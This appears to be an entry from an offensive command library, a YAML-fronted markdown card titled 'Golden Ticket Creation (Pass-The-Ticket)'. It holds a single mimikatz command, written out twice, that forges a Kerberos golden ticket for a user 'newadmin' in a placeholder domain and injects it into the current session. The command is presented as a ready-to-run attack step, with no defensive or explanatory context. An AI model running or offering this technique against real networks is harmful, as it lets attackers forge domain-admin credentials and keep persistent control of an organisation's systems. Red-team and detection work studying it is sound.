---
id: fb9386d0-9f4d-42ff-9a7a-7492d3ba8dcc
name: Golden Ticket Creation (Pass-The-Ticket) – Create the ticket for your current
  session
type: command
executor: bash
data: 'mimikatz kerberos::golden /user:newadmin /domain:domain.com /sid:S-1-5-21-3683589091-3492174527-1688384936
  /krbtgt: /ptt

  '
output: null
created_at: '2020-07-14T18:21:15.055212+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Golden Ticket Creation (Pass-The-Ticket) – Create the ticket for your current session

```bash
mimikatz kerberos::golden /user:newadmin /domain:domain.com /sid:S-1-5-21-3683589091-3492174527-1688384936 /krbtgt: /ptt

```


